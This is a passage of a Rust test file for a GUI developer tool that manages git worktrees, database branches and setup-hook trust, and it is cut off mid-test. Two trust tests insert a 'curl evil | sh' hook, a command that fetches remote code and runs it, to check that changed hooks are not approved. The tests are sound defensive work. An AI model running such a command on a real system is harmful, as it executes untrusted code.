//! Headless UI tests: every screen rendered with representative data (catches
//! layout and borrow panics that unit tests on plain data cannot, and checks
//! that the main controls are laid out with a real size), plus one mutation
//! driven end to end against the real core.
use super::Shell;
use crate::{
    activity::Activity,
    jobs::{self, Done, Event, LoadError, Refreshed},
    model::{
        ConfigModel, DatabaseModel, LoadPhase, LogFile, LogsModel, Page, PitchforkModel,
        ProjectModel, Tab,
    },
    ops::{FailureHint, JobMeta, TrustChoice},
    settings::Settings,
    state::{AppEvent, AppState, MAX_JOBS},
};
use chrono::Utc;
use devflow_core::{
    config::{
        Config, ConfigDocument, CowCapability, HooksSection, PostgresMode, PostgresSection,
        ProjectSection,
    },
    db::{BranchInfo, CowSource, RecordStatus, ServerStatus, SnapshotInfo},
    pitchfork::Daemon,
    project::Project,
    receipt::{DataBinding, Phase, PhaseState, Receipt, Status},
    registry::Entry,
    setup::WorkspaceStatus,
    trust::TrustState,
    worktree::Workspace,
};
use gpui_kit::{
    AppContext as _, Entity, TestAppContext, WindowHandle, base::Root, component::WindowExt as _,
    px, size, test::TestWindowExt as _,
};
use std::{cell::RefCell, path::PathBuf, rc::Rc, sync::Arc, time::Duration};
use uuid::Uuid;

fn workspace(name: &str, is_default: bool) -> Workspace {
    Workspace {
        name: name.into(),
        branch: Some(name.into()),
        path: PathBuf::from(format!("/tmp/shop/{name}")),
        git_dir: PathBuf::from(format!("/tmp/shop/{name}/.git")),
        is_default,
        locked: false,
        missing: false,
        head: Some("abc1234".into()),
        fingerprint: None,
    }
}

fn ready_receipt(name: &str, branch: Uuid) -> Receipt {
    let mut receipt = Receipt::new(Uuid::new_v4(), name, None);
    for phase in Phase::ALL {
        receipt.set_phase(phase, PhaseState::Done, None);
    }
    receipt.data = Some(DataBinding {
        branch_id: Some(branch),
        database: format!("df_{name}"),
        role: "dfl_x".into(),
        url: "postgres://x".into(),
        source: "empty".into(),
        owned: true,
    });
    receipt
}

fn branch(id: Uuid, name: &str) -> BranchInfo {
    BranchInfo {
        id,
        name: name.into(),
        db_name: format!("df_{name}"),
        role_name: "dfl_x".into(),
        source_kind: "empty".into(),
        source_id: None,
        instance_id: None,
        status: RecordStatus::Ready,
        cow: CowCapability::Verified,
        error: None,
        created_at: Utc::now(),
        size_bytes: Some(392 * 1024 * 1024),
        generation: 0,
        warnings: Vec::new(),
    }
}

/// A fully loaded project: workspaces in every state, a running server,
/// branches (one unattached), a snapshot, a daemon, config and logs.
fn loaded_model(logs_dir: &std::path::Path) -> ProjectModel {
    let entry = Entry {
        id: Uuid::new_v4(),
        name: "shop".into(),
        root: PathBuf::from("/tmp/shop"),
    };
    let key = crate::model::RequestKey {
        project: entry.id,
        epoch: 1,
    };
    let mut model = ProjectModel::new(entry, key);
    let (main_branch, feature_branch) = (Uuid::new_v4(), Uuid::new_v4());
    model.phase = LoadPhase::Ready;
    model.workspaces = vec![
        WorkspaceStatus {
            workspace: workspace("main", true),
            receipt: Some(ready_receipt("main", main_branch)),
            status: Some(Status::Ready),
            busy: false,
        },
        WorkspaceStatus {
            workspace: workspace("feature-x", false),
            receipt: Some(ready_receipt("feature-x", feature_branch)),
            status: Some(Status::NeedsAttention),
            busy: false,
        },
        WorkspaceStatus {
            workspace: workspace("adopted", false),
            receipt: None,
            status: None,
            busy: false,
        },
    ];
    model.selected_workspace = Some("main".into());
    model.database.configured = true;
    model.database.status = Some(ServerStatus {
        mode: PostgresMode::Managed,
        running: true,
        reachable: true,
        endpoint: Some("127.0.0.1:55432".into()),
        server_version: Some("18.1".into()),
        file_copy_method: Some("clone".into()),
        cow: CowCapability::Verified,
        cow_source: Some(CowSource::Measured),
        problem: None,
    });
    model.database.branches = vec![
        branch(main_branch, "main"),
        branch(feature_branch, "feature-x"),
        branch(Uuid::new_v4(), "orphan"),
    ];
    model.database.snapshots = vec![SnapshotInfo {
        id: Uuid::new_v4(),
        name: "seed".into(),
        version: 2,
        db_name: "df_seed".into(),
        source_branch_id: Some(main_branch),
        status: RecordStatus::Ready,
        created_at: Utc::now(),
        warnings: Vec::new(),
    }];
    model.pitchfork = PitchforkModel {
        loaded: true,
        available: true,
        daemons: vec![Daemon {
            id: "shop/web".into(),
            status: "running".into(),
            pid: Some(4242),
            dir: Some(PathBuf::from("/tmp/shop/main")),
        }],
        error: None,
    };
    let config = Config {
        project: ProjectSection {
            name: "shop".into(),
            id: model.key.project,
        },
        postgres: Some(PostgresSection::default()),
        hooks: HooksSection {
            setup: vec!["mise install".into(), "bun install".into()],
            switch: vec!["bun install --frozen-lockfile".into()],
            teardown: vec!["docker compose down".into()],
            ..HooksSection::default()
        },
        ..Config::default()
    };
    model.project = Some(Arc::new(Project {
        root: PathBuf::from("/tmp/shop"),
        git_common_dir: PathBuf::from("/tmp/shop/.git"),
        config_path: PathBuf::from("/tmp/shop/devflow.toml"),
        config,
    }));
    model.trust = Some(TrustState::Untrusted {
        digest: "x".into(),
        previously_trusted: false,
    });
    let doc = ConfigDocument {
        path: PathBuf::from("/tmp/shop/devflow.toml"),
        content: Config::template("shop", model.key.project, Some(PostgresMode::Managed)),
    };
    model.config = Some(ConfigModel::new(doc, model.entry.id, &model.entry.root));
    let log = logs_dir.join("20261010T101010-hooks.log");
    std::fs::write(&log, "$ mise install\nall good\n").unwrap();
    model.logs = LogsModel {
        files: vec![LogFile {
            name: "20261010T101010-hooks.log".into(),
            path: log.clone(),
            modified: None,
        }],
        selected: Some(log),
        content: Some(Ok("$ mise install\nall good\n".into())),
        error: None,
    };
    model
}

struct Harness {
    window: WindowHandle<Root>,
    state: Entity<AppState>,
    shell: Entity<Shell>,
}

fn open(cx: &mut TestAppContext, install: impl FnOnce(&mut AppState)) -> Harness {
    cx.update(gpui_kit::init);
    let state = cx.new(|_| AppState::for_test(Settings::default()));
    cx.update(|cx| state.update(cx, |s, _| install(s)));
    let for_shell = state.clone();
    let (window, shell) = cx.update(|cx| {
        gpui_kit::open_window(
            gpui_kit::WindowOptions {
                window_bounds: Some(gpui_kit::WindowBounds::Windowed(gpui_kit::Bounds {
                    origin: Default::default(),
                    size: size(px(1240.), px(800.)),
                })),
                ..Default::default()
            },
            cx,
            move |window, cx| cx.new(|cx| Shell::new(for_shell, window, cx)),
        )
        .expect("open window")
    });
    Harness {
        window: window.downcast::<Root>().expect("root"),
        state,
        shell,
    }
}

fn install_loaded(state: &mut AppState) {
    let dir = tempfile::tempdir().unwrap();
    let model = loaded_model(dir.path());
    state.entries = vec![model.entry.clone()];
    let entry = model.entry.clone();
    state.selection.select(entry);
    *state.selection.current_mut().unwrap() = ProjectModel {
        key: state.selection.current().unwrap().key,
        ..model
    };
    // Keep the log file alive for the test's duration.
    std::mem::forget(dir);
}

fn frame(cx: &mut TestAppContext, h: &Harness, check: impl FnOnce(&mut gpui_kit::Window)) {
    cx.update_window(h.window.into(), |_, window, cx| {
        window.render_frame(cx);
        check(window);
    })
    .unwrap();
}

#[gpui_kit::test]
fn every_tab_renders_with_data(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    frame(cx, &h, |window| {
        assert!(window.find("new-workspace").visible(), "workspaces toolbar");
        assert!(window.find("refresh").visible(), "header");
        // Rows render with their action buttons (table has a real size).
        assert!(
            window.find(("remove", 1usize)).visible(),
            "row action buttons"
        );
    });
    for (tab, probe) in [
        (Tab::Database, "server-up"),
        (Tab::Config, "config-save"),
        (Tab::Logs, "log"),
    ] {
        cx.update(|cx| h.state.update(cx, |s, cx| s.set_tab(tab, cx)));
        frame(cx, &h, |window| {
            let found = if probe == "log" {
                window.try_find(("log", 0usize))
            } else {
                window.try_find(probe)
            };
            assert!(
                found.is_some_and(|e| e.visible()),
                "{tab:?}: {probe} is laid out"
            );
        });
    }
    cx.update(|cx| h.state.update(cx, |s, cx| s.set_tab(Tab::Daemons, cx)));
    frame(cx, &h, |window| {
        assert!(
            window.find(("stop", 0usize)).visible(),
            "daemon row actions"
        );
    });
    cx.update(|cx| h.state.update(cx, |s, cx| s.set_page(Page::Settings, cx)));
    frame(cx, &h, |window| {
        assert!(window.find("save-settings").visible());
    });
}

#[gpui_kit::test]
fn dialogs_open_from_the_workspaces_tab(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    frame(cx, &h, |_| {});
    cx.update_window(h.window.into(), |_, window, cx| {
        window.click("new-workspace", cx)
    })
    .unwrap();
    frame(cx, &h, |window| {
        assert!(
            window.find("dialog").visible(),
            "New workspace opens a dialog"
        )
    });
    cx.update_window(h.window.into(), |_, window, cx| {
        assert!(
            window.has_focused_input(cx),
            "the name field has the cursor"
        );
        window.press("escape", cx)
    })
    .unwrap();
    // Removing a non-default workspace shows what will happen.
    cx.update_window(h.window.into(), |_, window, cx| {
        window.click(("remove", 1usize), cx)
    })
    .unwrap();
    frame(cx, &h, |window| {
        assert!(window.find("dialog").visible());
        assert!(window.find("delete-branch").visible(), "remove options");
    });
}

#[gpui_kit::test]
fn activity_panel_follows_progress(cx: &mut TestAppContext) {
    let h = open(cx, |state| {
        install_loaded(state);
        let key = state.selection.current().unwrap().key;
        let mut activity = Activity::new(key, "Create workspace feature-y");
        activity.apply([
            Event::Phase {
                phase: Phase::Database,
                state: PhaseState::Started,
                detail: None,
            },
            Event::Line("bun install".into()),
        ]);
        state.activity = Some(activity);
    });
    frame(cx, &h, |window| {
        assert!(window.find("new-workspace").visible());
    });
}

#[gpui_kit::test]
fn project_states_without_data_render(cx: &mut TestAppContext) {
    let h = open(cx, |state| {
        let entry = Entry {
            id: Uuid::nil(),
            name: "devflow-slim".into(),
            root: PathBuf::from("/tmp/devflow-slim"),
        };
        state.entries = vec![entry.clone()];
        state.selection.select(entry);
        state.selection.current_mut().unwrap().phase = LoadPhase::NotInitialized;
    });
    frame(cx, &h, |window| {
        assert!(window.find("initialize").visible(), "offers to initialize");
    });
    cx.update(|cx| {
        h.state.update(cx, |s, _| {
            s.selection.current_mut().unwrap().phase = LoadPhase::Failed("boom".into());
        })
    });
    frame(cx, &h, |window| {
        assert!(window.find("retry").visible());
    });
}

#[gpui_kit::test]
fn trust_snapshot_reset_and_initialize_dialogs_render(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    frame(cx, &h, |_| {});

    // Untrusted setup hooks are listed before they run.
    cx.update_window(h.window.into(), |_, window, cx| {
        super::dialogs::with_trust(&h.state, false, window, cx, |_, _, _| {});
    })
    .unwrap();
    frame(cx, &h, |window| {
        assert!(window.find("trust").visible(), "Trust and run");
        assert!(window.find("once").visible(), "Run once");
        assert!(window.find("skip").visible(), "Skip");
    });
    cx.update_window(h.window.into(), |_, window, cx| window.press("escape", cx))
        .unwrap();

    cx.update_window(h.window.into(), |_, window, cx| {
        super::db_dialogs::open_snapshot(&h.state, window, cx);
    })
    .unwrap();
    frame(cx, &h, |window| assert!(window.find("snapshot").visible()));
    cx.update_window(h.window.into(), |_, window, cx| window.press("escape", cx))
        .unwrap();

    cx.update_window(h.window.into(), |_, window, cx| {
        super::db_dialogs::open_reset(&h.state, window, cx);
    })
    .unwrap();
    frame(cx, &h, |window| assert!(window.find("reset").visible()));
    cx.update_window(h.window.into(), |_, window, cx| window.press("escape", cx))
        .unwrap();

    cx.update_window(h.window.into(), |_, window, cx| {
        super::dialogs::open_initialize(&h.state, PathBuf::from("/tmp/x"), window, cx);
    })
    .unwrap();
    frame(cx, &h, |window| assert!(window.find("init").visible()));
}

#[gpui_kit::test]
fn deleting_a_snapshot_asks_first(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    cx.update(|cx| h.state.update(cx, |s, cx| s.set_tab(Tab::Database, cx)));
    frame(cx, &h, |_| {});
    cx.update_window(h.window.into(), |_, window, cx| {
        window.click(("delete-snapshot", 0usize), cx)
    })
    .unwrap();
    frame(cx, &h, |window| assert!(window.find("confirm").visible()));
}

/// A scratch repository initialized for devflow, plus an isolated registry.
struct Scratch {
    _registry: std::sync::MutexGuard<'static, ()>,
    _config: tempfile::TempDir,
    _outer: tempfile::TempDir,
    entry: Entry,
}

fn scratch_project() -> Scratch {
    let registry = crate::jobs::REGISTRY_LOCK
        .lock()
        .unwrap_or_else(|e| e.into_inner());
    let config = tempfile::tempdir().unwrap();
    let outer = tempfile::tempdir().unwrap();
    let repo = outer.path().join("shop");
    std::fs::create_dir(&repo).unwrap();
    unsafe { std::env::set_var("DEVFLOW_CONFIG_DIR", config.path()) };
    for args in [
        &["init", "-q", "-b", "main"][..],
        &["commit", "-q", "--allow-empty", "-m", "init"][..],
    ] {
        let status = std::process::Command::new("git")
            .args(["-c", "user.name=t", "-c", "user.email=t@example.com"])
            .args(args)
            .current_dir(&repo)
            .status()
            .unwrap();
        assert!(status.success());
    }
    let project = devflow_core::project::init(
        &repo,
        devflow_core::project::InitOptions {
            name: None,
            postgres: None,
        },
    )
    .unwrap();
    let entry = Entry {
        id: project.id(),
        name: project.name().to_string(),
        root: project.root.clone(),
    };
    Scratch {
        _registry: registry,
        _config: config,
        _outer: outer,
        entry,
    }
}

/// Drive the executor (and its fake clock) until `done` holds.
fn settle(cx: &mut TestAppContext, h: &Harness, done: impl Fn(&AppState) -> bool) {
    for _ in 0..200 {
        cx.executor()
            .advance_clock(std::time::Duration::from_millis(150));
        cx.run_until_parked();
        if cx.read_entity(&h.state, |s, _| done(s)) {
            return;
        }
    }
    let report = cx.read_entity(&h.state, |s, _| {
        format!(
            "busy={:?} activity={:?}",
            s.busy(),
            s.activity
                .as_ref()
                .map(|a| (&a.title, &a.outcome, a.log.text()))
        )
    });
    panic!("the UI never settled: {report}");
}

fn open_scratch(cx: &mut TestAppContext, scratch: &Scratch) -> Harness {
    let entry = scratch.entry.clone();
    let h = open(cx, |state| {
        state.inflight = 0;
        state.entries = vec![entry.clone()];
        state.selection.select(entry);
    });
    cx.update(|cx| h.state.update(cx, |s, cx| s.refresh(cx)));
    settle(cx, &h, |s| {
        s.selection
            .current()
            .is_some_and(|m| m.phase == LoadPhase::Ready && !m.workspaces.is_empty())
    });
    h
}

fn create_workspace(cx: &mut TestAppContext, h: &Harness, name: &'static str) {
    use crate::ops::TrustChoice;
    let in_flight = cx.update(|cx| {
        h.state.update(cx, |s, _| {
            s.selection.current_mut().unwrap().begin_refresh()
        })
    });
    cx.update_window(h.window.into(), |_, window, cx| {
        h.state.update(cx, |s, cx| {
            s.create_workspace(name.into(), None, None, TrustChoice::NotNeeded, window, cx)
        });
    })
    .unwrap();
    assert!(
        cx.read_entity(&h.state, |s, _| s.busy().is_some()),
        "the project is locked while the job runs"
    );
    assert!(
        !cx.read_entity(&h.state, |s, _| s
            .selection
            .current()
            .unwrap()
            .accepts(&in_flight)),
        "a refresh that was running when the job started predates it"
    );
    settle(cx, h, |s| {
        s.busy().is_none()
            && s.selection
                .current()
                .is_some_and(|m| m.workspace(name).is_some())
    });
}

#[gpui_kit::test]
fn creating_a_workspace_runs_end_to_end(cx: &mut TestAppContext) {
    let scratch = scratch_project();
    let h = open_scratch(cx, &scratch);
    create_workspace(cx, &h, "feature-a");

    cx.read_entity(&h.state, |s, _| {
        let activity = s.activity.as_ref().expect("the operation left its output");
        assert!(
            matches!(activity.outcome, Some(Ok(_))),
            "{:?}",
            activity.outcome
        );
        assert!(
            activity
                .phases
                .iter()
                .any(|(p, st, _)| *p == Phase::Materialize && *st == PhaseState::Done)
        );
        assert!(activity.log.text().contains("[materialize]"));
        let model = s.selection.current().unwrap();
        assert_eq!(
            model.selected_workspace.as_deref(),
            Some("feature-a"),
            "the new workspace is selected"
        );
    });
}

#[gpui_kit::test]
fn force_is_offered_only_after_a_protection_error(cx: &mut TestAppContext) {
    use crate::ops::{RemoveChoice, TrustChoice};
    let scratch = scratch_project();
    let h = open_scratch(cx, &scratch);
    create_workspace(cx, &h, "feature-b");
    let path = cx.read_entity(&h.state, |s, _| {
        s.selection
            .current()
            .unwrap()
            .workspace("feature-b")
            .unwrap()
            .workspace
            .path
            .clone()
    });
    std::fs::write(path.join("unsaved.txt"), "work in progress").unwrap();
    let target = cx.read_entity(&h.state, |s, _| {
        s.selection
            .current()
            .unwrap()
            .workspace_ref("feature-b")
            .unwrap()
    });

    // A dirty worktree is refused without --force ...
    cx.update_window(h.window.into(), |_, window, cx| {
        // The toast stack only lets the newest toast take clicks.
        window.clear_notifications(cx);
        h.state.update(cx, |s, cx| {
            s.remove_workspace(
                target.clone(),
                RemoveChoice::default(),
                TrustChoice::NotNeeded,
                window,
                cx,
            )
        });
    })
    .unwrap();
    settle(cx, &h, |s| s.busy().is_none());
    cx.read_entity(&h.state, |s, _| {
        let outcome = &s.activity.as_ref().unwrap().outcome;
        assert!(
            matches!(outcome, Some(Err(e)) if e.contains("uncommitted changes")),
            "{outcome:?}"
        );
        assert!(
            s.selection
                .current()
                .unwrap()
                .workspace("feature-b")
                .is_some(),
            "nothing was removed"
        );
    });

    // ... and the failure toast offers a forced removal (once it finished sliding in).
    // The slide-in uses GPUI's wall-clock animation, not the test clock.
    std::thread::sleep(std::time::Duration::from_millis(450));
    frame(cx, &h, |window| {
        assert!(window.find("force-remove").visible())
    });
    cx.update_window(h.window.into(), |_, window, cx| {
        window.hover("force-remove", cx);
        window.click("force-remove", cx);
    })
    .unwrap();
    cx.run_until_parked();
    frame(cx, &h, |window| {
        assert!(window.find("remove").visible(), "force dialog is open")
    });
    // Dialogs also slide in on the wall clock.
    std::thread::sleep(std::time::Duration::from_millis(300));
    frame(cx, &h, |_| {});
    cx.update_window(h.window.into(), |_, window, cx| window.click("remove", cx))
        .unwrap();
    settle(cx, &h, |s| {
        s.busy().is_none()
            && s.selection
                .current()
                .is_some_and(|m| m.workspace("feature-b").is_none())
    });
    assert!(!path.exists(), "the worktree directory is gone");
}

// ---- regressions from the code review ---------------------------------------

fn update<R>(
    cx: &mut TestAppContext,
    h: &Harness,
    f: impl FnOnce(&mut AppState, &mut gpui_kit::Context<AppState>) -> R,
) -> R {
    cx.update(|cx| h.state.update(cx, f))
}

fn select_other_project(state: &mut AppState) {
    let entry = Entry {
        id: Uuid::new_v4(),
        name: "other".into(),
        root: PathBuf::from("/tmp/other"),
    };
    state.entries.push(entry.clone());
    state.selection.select(entry);
    let model = state.selection.current_mut().unwrap();
    model.phase = LoadPhase::Ready;
    // It has a workspace named like one of "shop"'s, somewhere else.
    model.workspaces = ["main", "feature-x"]
        .into_iter()
        .map(|name| WorkspaceStatus {
            workspace: Workspace {
                path: PathBuf::from(format!("/tmp/other/{name}")),
                git_dir: PathBuf::from(format!("/tmp/other/{name}/.git")),
                ..workspace(name, name == "main")
            },
            receipt: None,
            status: None,
            busy: false,
        })
        .collect();
    model.selected_workspace = Some("main".into());
}

#[gpui_kit::test]
fn a_job_that_outlives_the_first_tick_still_releases_the_project(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    let (tx, rx) = std::sync::mpsc::sync_channel(jobs::EVENT_QUEUE);
    let key = cx.read_entity(&h.state, |s, _| s.selection.current().unwrap().key);
    let in_flight = update(cx, &h, |s, _| {
        s.selection.current_mut().unwrap().begin_refresh()
    });
    cx.update_window(h.window.into(), |_, window, cx| {
        h.state.update(cx, |s, cx| {
            // What `start_job` sets up, with a channel the test controls.
            s.mutating.insert(key.project, "Slow job".into());
            s.inflight += 1;
            s.activity = Some(Activity::new(key, "Slow job"));
            s.watch_job(
                key,
                JobMeta::new("Slow job", FailureHint::None),
                rx,
                None,
                window,
                cx,
            );
        });
    })
    .unwrap();

    // Several ticks pass with output but no result: the job is still running.
    for step in 0..6 {
        tx.send(Event::Line(format!("step {step}"))).unwrap();
        cx.executor().advance_clock(Duration::from_millis(150));
        cx.run_until_parked();
        assert!(
            cx.read_entity(&h.state, |s, _| s.busy().is_some()),
            "still running after tick {step}"
        );
    }
    cx.executor().advance_clock(Duration::from_millis(150));
    cx.run_until_parked();
    cx.read_entity(&h.state, |s, _| {
        let text = s.activity.as_ref().unwrap().log.text();
        assert!(text.contains("step 5"), "{text}");
    });

    // The result arrives late and must still be applied.
    tx.send(Event::Finished(Ok(Done {
        summary: "All done".into(),
        ..Default::default()
    })))
    .unwrap();
    settle(cx, &h, |s| s.busy().is_none());
    cx.read_entity(&h.state, |s, _| {
        assert!(matches!(
            s.activity.as_ref().unwrap().outcome,
            Some(Ok(ref done)) if done.summary == "All done"
        ));
        assert_eq!(s.inflight, MAX_JOBS, "the job slot is free again");
        assert!(
            !s.selection.current().unwrap().accepts(&in_flight),
            "a refresh started before the job ended is stale"
        );
    });
}

#[gpui_kit::test]
fn a_job_that_vanishes_without_a_result_does_not_keep_the_project_locked(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    let (tx, rx) = std::sync::mpsc::sync_channel(jobs::EVENT_QUEUE);
    let key = cx.read_entity(&h.state, |s, _| s.selection.current().unwrap().key);
    cx.update_window(h.window.into(), |_, window, cx| {
        h.state.update(cx, |s, cx| {
            s.mutating.insert(key.project, "Doomed".into());
            s.inflight += 1;
            s.watch_job(
                key,
                JobMeta::new("Doomed", FailureHint::None),
                rx,
                None,
                window,
                cx,
            );
        });
    })
    .unwrap();
    drop(tx);
    settle(cx, &h, |s| s.busy().is_none());
}

#[gpui_kit::test]
fn the_trust_dialog_shows_the_whole_hooks_section_that_trusting_approves(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    frame(cx, &h, |_| {});
    let answers: Rc<RefCell<Vec<TrustChoice>>> = Rc::default();
    let recorded = answers.clone();
    cx.update_window(h.window.into(), |_, window, cx| {
        super::dialogs::with_trust(&h.state, false, window, cx, move |choice, _, _| {
            recorded.borrow_mut().push(choice)
        });
    })
    .unwrap();
    frame(cx, &h, |window| {
        for section in [
            "trust-setup",
            "trust-switch",
            "trust-teardown",
            "trust-timeout-per-command",
        ] {
            assert!(window.find(section).visible(), "{section} is listed");
        }
    });
    // Dialogs slide in on the wall clock.
    std::thread::sleep(Duration::from_millis(300));
    frame(cx, &h, |_| {});
    cx.update_window(h.window.into(), |_, window, cx| window.click("once", cx))
        .unwrap();
    cx.run_until_parked();
    let reviewed = cx.read_entity(&h.state, |s, _| {
        devflow_core::trust::scope(s.selection.current().unwrap().project.as_ref().unwrap())
    });
    assert_eq!(reviewed.teardown, ["docker compose down"]);
    assert_eq!(
        *answers.borrow(),
        [TrustChoice::Reviewed(reviewed)],
        "'Run once' runs exactly the content that was shown"
    );
}

#[gpui_kit::test]
fn a_trust_answer_is_dropped_when_another_project_was_selected(cx: &mut TestAppContext) {
    let h = open(cx, install_loaded);
    frame(cx, &h, |_| {});
    let answers: Rc<RefCell<Vec<TrustChoice>>> = Rc::default();
    let recorded = answers.clone();
    cx.update_window(h.window.into(), |_, window, cx| {
        super::dialogs::with_trust(&h.state, false, window, cx, move |choice, _, _| {
            recorded.borrow_mut().push(choice)
        });
    })
    .unwrap();
    std::thread::sleep(Duration::from_millis(300));
    frame(cx, &h, |_| {});
    // The selection moves on while the question is open.
    update(cx, &h, |s, cx| {
        select_other_project(s);
        cx.notify();
    });
    frame(cx, &h, |_| {});
    cx.update_window(h.window.into(), |_, window, cx| window.click("once", cx))
        .unwrap();
    cx.run_until_parked();
    assert!(
        answers.borrow().is_empty(),
        "the answer was about the other project: {:?}",
        answers.borrow()
    );
}

#[test]
fn approving_stores_exactly_the_reviewed_hooks_and_rejects_changed_ones() {
    use crate::ops::{Approval, approve_reviewed};
    use devflow_core::{project::Project, trust};

    let scratch = scratch_project();
    let root = scratch.entry.root.clone();
    let file = root.join("devflow.toml");
    let write_hooks = |setup: &str| {
        let text = std::fs::read_to_string(&file).unwrap();
        let base = text.split("[hooks]").next().unwrap();
        std::fs::write(
            &file,
            format!(
                "{base}[hooks]\nsetup = [{setup}]\nswitch = [\"echo switch\"]\nteardown = [\"echo bye\"]\n"
            ),
        )
        .unwrap();
    };
    write_hooks("\"echo one\"");
    let project = Project::open(&root).unwrap();
    let reviewed = trust::scope(&project);
    assert_eq!(reviewed.setup, ["echo one"]);
    assert_eq!(reviewed.switch, ["echo switch"]);
    assert_eq!(reviewed.teardown, ["echo bye"]);
    assert!(matches!(
        trust::state(&project).unwrap(),
        trust::TrustState::Untrusted { .. }
    ));

    // The hooks change after they were shown: nothing is approved, and the
    // new content comes back to be reviewed.
    write_hooks("\"echo one\", \"curl evil | sh\"");
    let Approval::Changed {
        message,
        project: fresh,
        scope,
    } = approve_reviewed(&project, &reviewed)
    else {
        panic!("a changed [hooks] section must not be approved");
    };
    assert!(message.contains("changed"), "{message}");
    assert!(scope.setup.contains(&"curl evil | sh".to_string()));
    assert!(matches!(
        trust::state(&fresh).unwrap(),
        trust::TrustState::Untrusted { .. }
    ));

    // Reviewing the new content and approving it works.
    assert!(matches!(
        approve_reviewed(&fresh, &scope),
        Approval::Approved
    ));
    assert_eq!(trust::state(&fresh).unwrap(), trust::TrustState::Trusted);
}

#[gpui_kit::test]
fn trust_and_run_approves_what_was_shown_and_reopens_when_the_hooks_changed(
    cx: &mut TestAppContext,
) {
    use devflow_core::trust;
    let scratch = scratch_project();
    let root = scratch.entry.root.clone();
    let file = root.join("devflow.toml");
    let write_hooks = |setup: &str| {
        let text = std::fs::read_to_string(&file).unwrap();
        let base = text.split("[hooks]").next().unwrap();
        std::fs::write(&file, format!("{base}[hooks]\nsetup = [{setup}]\n")).unwrap();
    };
    write_hooks("\"echo one\"");
    let h = open_scratch(cx, &scratch);
    let model_trust = |cx: &mut TestAppContext| {
        cx.read_entity(&h.state, |s, _| {
            let project = s.selection.current().unwrap().project.clone().unwrap();
            (trust::state(&project).unwrap(), trust::scope(&project))
        })
    };
    assert!(matches!(
        model_trust(cx).0,
        trust::TrustState::Untrusted { .. }
    ));

    let answers: Rc<RefCell<Vec<TrustChoice>>> = Rc::default();
    let recorded = answers.clone();
    cx.update_window(h.window.into(), |_, window, cx| {
        super::dialogs::with_trust(&h.state, false, window, cx, move |choice, _, _| {
            recorded.borrow_mut().push(choice)
        });
    })
    .unwrap();
    std::thread::sleep(Duration::from_millis(300));
    frame(cx, &h, |_| {});
    let shown = model_trust(cx).1;
    assert_eq!(shown.setup, ["echo one"]);

    // The file changes after the user looked at it; then they click Trust.
    write_hooks("\"echo one\", \"curl evil | sh\"");
    cx.update_window(h.window.into(), |_, window, cx| window.click("trust", cx))
        .unwrap();
    for _ in 0..20 {
        cx.executor().advance_clock(Duration::from_millis(150));
        cx.run_until_parked();
    }
    assert!(
        answers.borrow().is_empty(),
        "nothing ran: {:?}",
        answers.borrow()
    );
    frame(cx, &h, |window| {
        assert!(
            window.find("trust-error").visible(),
            "the dialog says why, and stays open"
        );
    });
    let (state, now) = model_trust(cx);
    assert!(
        matches!(state, trust::TrustState::Untrusted { .. }),
        "nothing was approved: {state:?}"
    );
    assert_eq!(
        now.setup,
        ["echo one", "curl evil | sh"],
        "the dialog now holds the new content"
    );

    // Trusting the new content approves exactly that and runs it.
    cx.update_window(h.window.into(), |_, window, cx| window.click("trust", cx))
        .unwrap();
    for _ in 0..20 {
        cx.executor().advance_clock(Duration::from_millis(150));
        cx.run_until_parked();
    }
    assert_eq!(*answers.borrow(), [TrustChoice::Reviewed(now)]);
    let project = cx.read_entity(&h.state, |s, _| {
        s.selection.current().unwrap().project.clone().unwrap()
    });
    assert_eq!(trust::state(&project).unwrap(), trust::TrustState::Trusted);
}

fn config_text(cx: &mut TestAppContext, h: &Harness) -> String {
    cx.update(|cx| {
        let project = h.shell.read(cx).project.clone();
        let config = project.read(cx).config.clone();
        config.read(cx).text(cx)
    })
}

#[gpui_kit::test]
fn the_config_editor_follows_the_selected_project_and_save_is_bound_to_its_document(
    cx: &mut TestAppContext,
) {
    let dir = tempfile::tempdir().unwrap();
    let make = |name: &str| -> (Entry, ConfigDocument) {
        let root = dir.path().join(name);
        std::fs::create_dir_all(&root).unwrap();
        let id = Uuid::new_v4();
        std::fs::write(root.join("devflow.toml"), Config::template(name, id, None)).unwrap();
        let entry = Entry {
            id,
            name: name.into(),
            root: root.clone(),
        };
        (entry, ConfigDocument::open(&root).unwrap())
    };
    let (entry_a, doc_a) = make("alpha");
    let (entry_b, doc_b) = make("beta");
    let load = |state: &mut AppState, entry: &Entry, doc: &ConfigDocument| {
        if !state.entries.iter().any(|e| e.id == entry.id) {
            state.entries.push(entry.clone());
        }
        state.selection.select(entry.clone());
        let model = state.selection.current_mut().unwrap();
        model.phase = LoadPhase::Ready;
        model.config = Some(ConfigModel::new(doc.clone(), entry.id, &entry.root));
    };
    let h = open(cx, |s| {
        load(s, &entry_a, &doc_a);
        s.tab = Tab::Config;
    });
    frame(cx, &h, |_| {});
    assert_eq!(config_text(cx, &h), doc_a.content);
    let identity = |cx: &mut TestAppContext| {
        cx.read_entity(&h.state, |s, _| {
            s.selection
                .current()
                .unwrap()
                .config
                .as_ref()
                .unwrap()
                .identity
                .clone()
        })
    };
    let a_identity = identity(cx);

    // Load B: both documents start counting at the same place per project, but
    // the editor must follow the selection, not a per-project counter.
    update(cx, &h, |s, cx| {
        load(s, &entry_b, &doc_b);
        cx.notify();
    });
    frame(cx, &h, |_| {});
    assert_eq!(
        config_text(cx, &h),
        doc_b.content,
        "the editor shows the selected project's file"
    );
    let b_identity = identity(cx);
    assert_ne!(a_identity, b_identity);

    let save = |cx: &mut TestAppContext, text: String, loaded| {
        cx.update_window(h.window.into(), |_, window, cx| {
            h.state
                .update(cx, |s, cx| s.save_config(text, loaded, window, cx))
        })
        .unwrap();
        cx.run_until_parked();
    };
    let read = |entry: &Entry| std::fs::read_to_string(entry.root.join("devflow.toml")).unwrap();

    // Text loaded from A's document is refused while B is selected ...
    save(
        cx,
        format!("{}# written from A's editor\n", doc_a.content),
        a_identity,
    );
    assert_eq!(read(&entry_b), doc_b.content, "B was not overwritten");
    assert_eq!(read(&entry_a), doc_a.content, "A was not written either");

    // ... and B's own text goes to B's file.
